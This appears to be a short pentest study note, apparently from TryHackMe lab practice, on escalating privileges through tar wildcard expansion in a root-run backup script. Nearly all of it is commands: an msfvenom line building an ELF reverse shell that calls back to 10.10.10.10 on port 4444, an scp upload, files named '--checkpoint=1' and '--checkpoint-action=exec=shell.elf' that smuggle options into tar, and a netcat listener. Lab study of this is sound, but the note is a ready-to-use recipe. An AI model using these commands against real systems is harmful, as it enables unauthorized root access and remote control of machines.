---
description: like * in file naming
---

# Wildcards

when you have \* in scheduling, you can add a file along the main file in schedule. to do that, first consider this scenario:

```bash
user@debian:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

so you can put the files you want to run as sudo in this directory.&#x20;

so you make a ELF reverse shell for the target machine

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```
{% endcode %}

then you have to `scp` the file in the target machine :&#x20;

```bash
scp <TARGET-FILE> user@<IP-ADDRESS>:/ADDRESS/TO/UPLOAD

# for the VM on THM you have to add this flag probably : -oHostKeyAlgorithms=+ssh-rsa
```

then you give the access and run two commands :&#x20;

```bash
chmod +x /home/user/shell.elf

touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

now all you have to do is to listen for a call on the selected port&#x20;

```bash
nc -nvlp 4444
```
